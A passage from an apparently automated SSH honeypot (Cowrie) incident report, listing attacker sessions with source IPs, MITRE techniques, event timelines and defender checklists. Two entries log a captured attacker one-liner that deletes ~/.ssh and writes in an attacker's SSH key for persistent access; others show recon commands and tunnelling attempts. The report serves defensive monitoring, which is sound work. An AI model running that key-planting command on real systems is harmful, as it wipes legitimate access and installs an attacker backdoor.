- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8293f19ee090

| Field | Detail |
|---|---|
| **Source IP** | `51.81.84[.]41` |
| **First Seen** | 2026-08-17 03:06 |
| **Last Seen** | 2026-08-17 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:06:13` | `cowrie.session.connect` |
| `2026-08-17 03:06:13` | `cowrie.client.version` |
| `2026-08-17 03:06:13` | `cowrie.client.kex` |
| `2026-08-17 03:06:13` | `cowrie.login.success` |
| `2026-08-17 03:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.81.84[.]41` to AbuseIPDB if not already reported
- [ ] Block `51.81.84[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10c0107dcaa

| Field | Detail |
|---|---|
| **Source IP** | `51.81.84[.]41` |
| **First Seen** | 2026-08-17 03:06 |
| **Last Seen** | 2026-08-17 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:06:13` | `cowrie.session.connect` |
| `2026-08-17 03:06:13` | `cowrie.client.version` |
| `2026-08-17 03:06:13` | `cowrie.client.kex` |
| `2026-08-17 03:06:13` | `cowrie.login.success` |
| `2026-08-17 03:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.81.84[.]41` to AbuseIPDB if not already reported
- [ ] Block `51.81.84[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b74da7855a

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-08-17 03:07 |
| **Last Seen** | 2026-08-17 03:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:07:19` | `cowrie.session.connect` |
| `2026-08-17 03:07:19` | `cowrie.client.version` |
| `2026-08-17 03:07:19` | `cowrie.client.kex` |
| `2026-08-17 03:07:20` | `cowrie.login.success` |
| `2026-08-17 03:07:21` | `cowrie.session.params` |
| `2026-08-17 03:07:21` | `cowrie.command.input` |
| `2026-08-17 03:07:21` | `cowrie.command.failed` |
| `2026-08-17 03:07:22` | `cowrie.log.closed` |
| `2026-08-17 03:07:22` | `cowrie.session.params` |
| `2026-08-17 03:07:22` | `cowrie.command.input` |
| `2026-08-17 03:07:23` | `cowrie.session.file_download` |
| `2026-08-17 03:07:23` | `cowrie.log.closed` |
| `2026-08-17 03:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1bc84bf1a4

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-08-17 03:07 |
| **Last Seen** | 2026-08-17 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:07:23` | `cowrie.session.connect` |
| `2026-08-17 03:07:23` | `cowrie.client.version` |
| `2026-08-17 03:07:23` | `cowrie.client.kex` |
| `2026-08-17 03:07:24` | `cowrie.login.success` |
| `2026-08-17 03:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce467b5810ce

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-08-17 03:07 |
| **Last Seen** | 2026-08-17 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:07:25` | `cowrie.session.connect` |
| `2026-08-17 03:07:25` | `cowrie.client.version` |
| `2026-08-17 03:07:25` | `cowrie.client.kex` |
| `2026-08-17 03:07:26` | `cowrie.login.success` |
| `2026-08-17 03:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb16f884660

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-08-17 03:08 |
| **Last Seen** | 2026-08-17 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:08:00` | `cowrie.session.connect` |
| `2026-08-17 03:08:00` | `cowrie.client.version` |
| `2026-08-17 03:08:00` | `cowrie.client.kex` |
| `2026-08-17 03:08:01` | `cowrie.login.success` |
| `2026-08-17 03:08:02` | `cowrie.session.params` |
| `2026-08-17 03:08:02` | `cowrie.command.input` |
| `2026-08-17 03:08:02` | `cowrie.command.failed` |
| `2026-08-17 03:08:02` | `cowrie.log.closed` |
| `2026-08-17 03:08:03` | `cowrie.session.params` |
| `2026-08-17 03:08:03` | `cowrie.command.input` |
| `2026-08-17 03:08:03` | `cowrie.session.file_download` |
| `2026-08-17 03:08:03` | `cowrie.log.closed` |
| `2026-08-17 03:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a90cdf9c4f

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-08-17 03:08 |
| **Last Seen** | 2026-08-17 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:08:03` | `cowrie.session.connect` |
| `2026-08-17 03:08:03` | `cowrie.client.version` |
| `2026-08-17 03:08:03` | `cowrie.client.kex` |
| `2026-08-17 03:08:04` | `cowrie.login.success` |
| `2026-08-17 03:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae47db413e4f

| Field | Detail |
|---|---|
| **Source IP** | `14.46.87[.]209` |
| **First Seen** | 2026-08-17 03:08 |
| **Last Seen** | 2026-08-17 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:08:05` | `cowrie.session.connect` |
| `2026-08-17 03:08:05` | `cowrie.client.version` |
| `2026-08-17 03:08:05` | `cowrie.client.kex` |
| `2026-08-17 03:08:06` | `cowrie.login.success` |
| `2026-08-17 03:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.46.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `14.46.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20417322a7f6

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 03:24 |
| **Last Seen** | 2026-08-17 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:24:48` | `cowrie.session.connect` |
| `2026-08-17 03:24:48` | `cowrie.client.version` |
| `2026-08-17 03:24:48` | `cowrie.client.kex` |
| `2026-08-17 03:24:49` | `cowrie.login.success` |
| `2026-08-17 03:24:50` | `cowrie.session.params` |
| `2026-08-17 03:24:50` | `cowrie.command.input` |
| `2026-08-17 03:24:50` | `cowrie.log.closed` |
| `2026-08-17 03:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a90c2635b169

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]227` |
| **First Seen** | 2026-08-17 03:26 |
| **Last Seen** | 2026-08-17 03:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:26:07` | `cowrie.session.connect` |
| `2026-08-17 03:26:08` | `cowrie.client.version` |
| `2026-08-17 03:26:08` | `cowrie.client.kex` |
| `2026-08-17 03:26:10` | `cowrie.login.success` |
| `2026-08-17 03:26:11` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ae6de4c495

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-08-17 03:31 |
| **Last Seen** | 2026-08-17 03:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:31:06` | `cowrie.session.connect` |
| `2026-08-17 03:31:07` | `cowrie.client.version` |
| `2026-08-17 03:31:07` | `cowrie.client.kex` |
| `2026-08-17 03:31:09` | `cowrie.login.success` |
| `2026-08-17 03:31:10` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d561a866ed

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-17 03:31 |
| **Last Seen** | 2026-08-17 03:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:31:17` | `cowrie.session.connect` |
| `2026-08-17 03:31:18` | `cowrie.client.version` |
| `2026-08-17 03:31:18` | `cowrie.client.kex` |
| `2026-08-17 03:31:21` | `cowrie.login.success` |
| `2026-08-17 03:31:22` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe07b6f36af

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-08-17 03:32 |
| **Last Seen** | 2026-08-17 03:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:32:29` | `cowrie.session.connect` |
| `2026-08-17 03:32:30` | `cowrie.client.version` |
| `2026-08-17 03:32:30` | `cowrie.client.kex` |
| `2026-08-17 03:32:30` | `cowrie.login.success` |
| `2026-08-17 03:32:31` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7d44122a96

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-08-17 03:32 |
| **Last Seen** | 2026-08-17 03:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:32:37` | `cowrie.session.connect` |
| `2026-08-17 03:32:38` | `cowrie.client.version` |
| `2026-08-17 03:32:38` | `cowrie.client.kex` |
| `2026-08-17 03:32:40` | `cowrie.login.success` |
| `2026-08-17 03:32:42` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b8d6a84164

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-17 03:32 |
| **Last Seen** | 2026-08-17 03:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:32:47` | `cowrie.session.connect` |
| `2026-08-17 03:32:48` | `cowrie.client.version` |
| `2026-08-17 03:32:48` | `cowrie.client.kex` |
| `2026-08-17 03:32:50` | `cowrie.login.success` |
| `2026-08-17 03:32:51` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4366daa9ecb

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-08-17 03:32 |
| **Last Seen** | 2026-08-17 03:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:32:57` | `cowrie.session.connect` |
| `2026-08-17 03:32:58` | `cowrie.client.version` |
| `2026-08-17 03:32:58` | `cowrie.client.kex` |
| `2026-08-17 03:33:02` | `cowrie.login.success` |
| `2026-08-17 03:33:02` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d117548005b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 03:36 |
| **Last Seen** | 2026-08-17 03:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:36:21` | `cowrie.session.connect` |
| `2026-08-17 03:36:21` | `cowrie.client.version` |
| `2026-08-17 03:36:21` | `cowrie.client.kex` |
| `2026-08-17 03:36:21` | `cowrie.login.success` |
| `2026-08-17 03:36:22` | `cowrie.direct-tcpip.request` |
| `2026-08-17 03:36:22` | `cowrie.direct-tcpip.data` |
| `2026-08-17 03:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5e037283be

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 03:43 |
| **Last Seen** | 2026-08-17 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:43:55` | `cowrie.session.connect` |
| `2026-08-17 03:43:55` | `cowrie.client.version` |
| `2026-08-17 03:43:55` | `cowrie.client.kex` |
| `2026-08-17 03:43:55` | `cowrie.login.success` |
| `2026-08-17 03:43:56` | `cowrie.session.params` |
| `2026-08-17 03:43:56` | `cowrie.command.input` |
| `2026-08-17 03:43:57` | `cowrie.log.closed` |
| `2026-08-17 03:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a3038deca3

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-17 04:00 |
| **Last Seen** | 2026-08-17 04:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:00:36` | `cowrie.session.connect` |
| `2026-08-17 04:00:36` | `cowrie.client.version` |
| `2026-08-17 04:00:36` | `cowrie.client.kex` |
| `2026-08-17 04:00:37` | `cowrie.login.success` |
| `2026-08-17 04:00:38` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e81fefef34

| Field | Detail |
|---|---|
| **Source IP** | `102.211.7[.]162` |
| **First Seen** | 2026-08-17 04:00 |
| **Last Seen** | 2026-08-17 04:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:00:43` | `cowrie.session.connect` |
| `2026-08-17 04:00:43` | `cowrie.client.version` |
| `2026-08-17 04:00:43` | `cowrie.client.kex` |
| `2026-08-17 04:00:44` | `cowrie.login.success` |
| `2026-08-17 04:00:45` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.7[.]162` to AbuseIPDB if not already reported
- [ ] Block `102.211.7[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d6a3a65c47

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 04:03 |
| **Last Seen** | 2026-08-17 04:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:03:01` | `cowrie.session.connect` |
| `2026-08-17 04:03:01` | `cowrie.client.version` |
| `2026-08-17 04:03:01` | `cowrie.client.kex` |
| `2026-08-17 04:03:01` | `cowrie.login.success` |
| `2026-08-17 04:03:03` | `cowrie.session.params` |
| `2026-08-17 04:03:03` | `cowrie.command.input` |
| `2026-08-17 04:03:03` | `cowrie.log.closed` |
| `2026-08-17 04:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61cc725d7755

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-17 04:05 |
| **Last Seen** | 2026-08-17 04:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:05:53` | `cowrie.session.connect` |
| `2026-08-17 04:05:54` | `cowrie.client.version` |
| `2026-08-17 04:05:54` | `cowrie.client.kex` |
| `2026-08-17 04:05:55` | `cowrie.login.success` |
| `2026-08-17 04:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199b9f49adb5

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-08-17 04:06 |
| **Last Seen** | 2026-08-17 04:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:06:01` | `cowrie.session.connect` |
| `2026-08-17 04:06:02` | `cowrie.client.version` |
| `2026-08-17 04:06:02` | `cowrie.client.kex` |
| `2026-08-17 04:06:04` | `cowrie.login.success` |
| `2026-08-17 04:06:05` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e2fbbb443f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]11` |
| **First Seen** | 2026-08-17 04:06 |
| **Last Seen** | 2026-08-17 04:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:06:06` | `cowrie.session.connect` |
| `2026-08-17 04:06:07` | `cowrie.client.version` |
| `2026-08-17 04:06:07` | `cowrie.client.kex` |
| `2026-08-17 04:06:10` | `cowrie.login.success` |
| `2026-08-17 04:06:10` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]11` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335dc1988716

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-08-17 04:16 |
| **Last Seen** | 2026-08-17 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

